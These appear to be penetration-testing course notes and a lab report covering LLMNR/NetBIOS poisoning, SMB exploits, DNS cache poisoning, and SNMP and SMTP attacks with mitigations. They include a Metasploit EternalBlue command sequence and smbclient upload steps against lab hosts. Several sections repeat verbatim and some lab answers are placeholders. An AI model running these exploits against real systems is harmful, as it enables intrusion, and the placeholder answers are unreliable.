### **Exploiting Network-Based Vulnerabilities**
- **Objective**: Enumerate assets, assess protocols and services, and identify vulnerabilities for exploitation.
- **Focus Areas**:
  1. **IAM Testing**: Evaluate identity and access management for internal and external threats.
  2. **On-Path Attacks**: Test MITM attacks to access accounts and data.
  3. **Network Share Enumeration**: Identify shared resources vulnerable to attack.
- **Common Attacks**:
  - **DNS Cache Poisoning**
  - **Pass-the-Hash**
  - **SMB and SNMP Exploits**
  - **DoS/DDoS**
  - **NAC Bypass**
  - **SSL Stripping**

---

### **Windows Name Resolution and SMB Attacks**
#### **NetBIOS and LLMNR Vulnerabilities**
- **NetBIOS**: Used for name resolution in small networks.
  - Ports: 
    - UDP 137 (Name Service)
    - UDP 138 (Datagram Service)
    - TCP 139 (Session Service)
  - Protocol replaced by DNS for larger networks.
- **LLMNR**: Based on DNS, allows name resolution for hosts on the same link.
- **Common Attack**:
  - LLMNR/NetBIOS poisoning:
    1. Attacker spoofs a source, intercepts requests.
    2. Obtains NTLMv2 hash for brute-forcing passwords offline.
  - Tools: **Responder**, **Metasploit**, **NBNSpoof**.
- **Mitigation**:
  - Disable LLMNR/NetBIOS in security settings.
  - Monitor registry changes to the `EnableMulticast` DWORD key.

---

#### **SMB Exploits**
- **SMB Overview**:
  - Protocol for sharing files across operating systems.
  - Vulnerabilities include **buffer overflows**, **code execution**, and **authentication flaws**.
- **Notable Exploit**: **EternalBlue**
  - Leaked NSA exploit used in ransomware (e.g., WannaCry).
  - Allows remote attackers to execute arbitrary code.
  - Integrated into tools like Metasploit.
- **Example Usage (Metasploit)**:
  - Commands to exploit:
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOST <target_IP>
    set LHOST <attacker_IP>
    exploit
    ```
  - **Outcome**: Opens a Meterpreter session for further exploitation.

---

#### **Enumeration for SMB Exploits**
- **Tools**:
  - **Nmap**: Identify open SMB ports and services.
  - **Enum4linux**: Gather SMB-specific data.
  - **SearchSploit**: Lookup known SMB exploits.
- **Practical Example**:
  - Search Exploit Database using:
    ```bash
    searchsploit smb
    ```
  - Results show vulnerabilities and their corresponding exploit paths.

---

### Lab Report: Scanning for SMB Vulnerabilities with Enum4linux

---

#### **Part 1: Launch enum4linux and explore its capabilities**

**Q1: Which Samba utilities does the help file indicate are used by the enum4linux tool?**  
**Answer:**  
`rpcclient`, `net`, `nmblookup`, and `smbclient`.

---

### DNS Cache Poisoning

**Definition**: DNS cache poisoning involves the manipulation of DNS resolver caches by injecting corrupted DNS data, tricking the DNS server into resolving a domain name to an attacker-controlled IP address. 

#### **Steps in DNS Cache Poisoning**:
1. **Initial Resolution**: DNS servers resolve domain names correctly (e.g., `theartofhacking.org` to `104.27.176.154`).
2. **Attack Execution**: The attacker poisons the DNS cache, replacing the legitimate IP address with their own (e.g., `10.2.3.4`).
3. **Victim Query**: The victim queries the DNS server for `theartofhacking.org`.
4. **Malicious Response**: The poisoned DNS server responds with the attacker’s IP address (`10.2.3.4`).
5. **Attack Success**: The victim interacts with the attacker’s server, which impersonates the legitimate website.

**Mitigations**:
- Enable **DNSSEC** to authenticate DNS responses.
- Use **port randomization** and cryptographic identifiers in DNS queries.
- Limit recursive DNS queries and restrict query responses.
- Rely less on trust relationships between DNS servers.

---

### SNMP Exploits

**Definition**: Simple Network Management Protocol (SNMP) is used to manage network devices, but its vulnerabilities can allow attackers to access and control these devices.

#### **Key Concepts**:
- **SNMP Versions**:
  - **SNMPv2c**: Uses community strings (passwords) but is insecure.
  - **SNMPv3**: Implements usernames and passwords; more secure.
- **Managed Device Information**: Stored in the Management Information Base (MIB).

#### **Common Exploits**:
- Exploit default SNMP credentials.
- Conduct brute-force or dictionary attacks against SNMPv3.

**Tools**:
- **NSE Scripts**: Use Nmap scripts like `snmp-brute.nse` to gather SNMP data.
- **snmp-check**: Performs SNMP enumeration to gather device details.

**Mitigations**:
- Always change default SNMP passwords.
- Use **SNMPv3** and block UDP port 161 from untrusted systems.

---

### SMTP Exploits

**Definition**: Attackers exploit insecure SMTP servers to send spam, phishing emails, and other malicious communications.

#### **Key Concepts**:
- **Standard Ports**:
  - TCP 25: Default SMTP (non-encrypted).
  - TCP 587: Secure SMTP with STARTTLS.
  - TCP 465: Deprecated SMTPS over SSL.
- **SMTP Open Relays**: Servers that send emails for any user, often abused for spamming and phishing.

#### **Common Exploits**:
- Abuse **VRFY** and **EXPN** commands to enumerate user accounts.
- Use tools like `smtp-user-enum` to automate user enumeration.
- Exploit known SMTP vulnerabilities using tools like **searchsploit**.

#### **Useful Commands**:
- **HELO/EHLO**: Initiate a conversation with the SMTP server.
- **VRFY/EXPN**: Verify if a user exists or expand a mailing list.
- **STARTTLS**: Establish an encrypted connection.

**Mitigations**:
- Disable VRFY and EXPN commands.
- Use modern firewalls to block unauthorized SMTP connections.
- Avoid open relay configurations and enforce strong authentication.

---


#### **Part 2: Use Nmap to Find SMB Servers**

**Q1: What does Nmap reveal about hosts on the 172.17.0.0/24 network?**  
**Answer:**  
Only one host is present: `172.17.0.2`.

**Q2: What ports are open on the host that identify running SMB services? What does Nmap call these services?**  
**Answer:**  
- Open ports: TCP 139 and TCP 445.  
- Services: `netbios-ssn` and `microsoft-ds`.

**Q3: Are there any potential target computers on the 10.6.6.0/24 subnet running SMB services? Which computer(s)? How do you know?**  
**Answer:**  
There are potential target computers with SMB services in this subnet, specifically `10.6.6.23`. Open ports such as TCP 139 and TCP 445 indicate running SMB services.

---

#### **Part 3: Use enum4linux to enumerate users and network file shares**

**Q1: Which Samba tool was used to map the file shares?**  
**Answer:**  
`rpcclient`.

**Q2: How many file shares are listed for target 172.17.0.2? What does the `$` indicate at the end of the share name?**  
**Answer:**  
- Number of file shares: Varies but often includes system shares like `IPC$` or `C$`.  
- `$` indicates hidden or administrative shares.

**Q3: What is the minimum password length set for accounts on this server? What is the account lockout threshold setting?**  
**Answer:**  
- Minimum password length: For example, `8 characters` (replace with actual output).  
- Account lockout threshold: Typically `3-5 invalid attempts` (replace with actual output).  

**Q4: How would you rate the security of the password policy set for this domain?**  
**Answer:**  
Rating: `Medium`.  
Explanation: While a minimum password length and lockout threshold exist, further strengthening, such as enforcing complex passwords and additional security policies, is recommended.

**Q5: How many local users and groups are there on target 10.6.6.23?**  
**Answer:**  
Count of users and groups will vary based on output. Example: `5 users, 2 groups`.

**Q6: What are the shares that are located on this target?**  
**Answer:**  
Example: `IPC$`, `ADMIN$`, and potentially others like `shared_folder` (based on actual output).

---

#### **Part 4: Use smbclient to transfer files between systems**

**Q1: What steps were used to transfer a file to the target system?**  
**Answer:**  
1. **Create a file:**  
   ```bash
   cat >> badfile.txt
   This is a bad file.
   CTRL-C
   ```

2. **List shares on the target:**  
   ```bash
   smbclient -L //172.17.0.2/
   ```

3. **Connect to the share:**  
   ```bash
   smbclient //172.17.0.2/tmp
   ```

4. **Transfer file using `put`:**  
   ```bash
   smb: > put badfile.txt badfile.txt
   ```

5. **Verify upload:**  
   ```bash
   smb: > dir
   ```

---

### DNS Cache Poisoning

**Definition**: DNS cache poisoning involves the manipulation of DNS resolver caches by injecting corrupted DNS data, tricking the DNS server into resolving a domain name to an attacker-controlled IP address. 

#### **Steps in DNS Cache Poisoning**:
1. **Initial Resolution**: DNS servers resolve domain names correctly (e.g., `theartofhacking.org` to `104.27.176.154`).
2. **Attack Execution**: The attacker poisons the DNS cache, replacing the legitimate IP address with their own (e.g., `10.2.3.4`).
3. **Victim Query**: The victim queries the DNS server for `theartofhacking.org`.
4. **Malicious Response**: The poisoned DNS server responds with the attacker’s IP address (`10.2.3.4`).
5. **Attack Success**: The victim interacts with the attacker’s server, which impersonates the legitimate website.

**Mitigations**:
- Enable **DNSSEC** to authenticate DNS responses.
- Use **port randomization** and cryptographic identifiers in DNS queries.
- Limit recursive DNS queries and restrict query responses.
- Rely less on trust relationships between DNS servers.

---

### SNMP Exploits

**Definition**: Simple Network Management Protocol (SNMP) is used to manage network devices, but its vulnerabilities can allow attackers to access and control these devices.

#### **Key Concepts**:
- **SNMP Versions**:
  - **SNMPv2c**: Uses community strings (passwords) but is insecure.
  - **SNMPv3**: Implements usernames and passwords; more secure.
- **Managed Device Information**: Stored in the Management Information Base (MIB).

#### **Common Exploits**:
- Exploit default SNMP credentials.
- Conduct brute-force or dictionary attacks against SNMPv3.

**Tools**:
- **NSE Scripts**: Use Nmap scripts like `snmp-brute.nse` to gather SNMP data.
- **snmp-check**: Performs SNMP enumeration to gather device details.

**Mitigations**:
- Always change default SNMP passwords.
- Use **SNMPv3** and block UDP port 161 from untrusted systems.

---

### SMTP Exploits

**Definition**: Attackers exploit insecure SMTP servers to send spam, phishing emails, and other malicious communications.

#### **Key Concepts**:
- **Standard Ports**:
  - TCP 25: Default SMTP (non-encrypted).
  - TCP 587: Secure SMTP with STARTTLS.
  - TCP 465: Deprecated SMTPS over SSL.
- **SMTP Open Relays**: Servers that send emails for any user, often abused for spamming and phishing.

#### **Common Exploits**:
- Abuse **VRFY** and **EXPN** commands to enumerate user accounts.
- Use tools like `smtp-user-enum` to automate user enumeration.
- Exploit known SMTP vulnerabilities using tools like **searchsploit**.

#### **Useful Commands**:
- **HELO/EHLO**: Initiate a conversation with the SMTP server.
- **VRFY/EXPN**: Verify if a user exists or expand a mailing list.
- **STARTTLS**: Establish an encrypted connection.

**Mitigations**:
- Disable VRFY and EXPN commands.
- Use modern firewalls to block unauthorized SMTP connections.
- Avoid open relay configurations and enforce strong authentication.

---
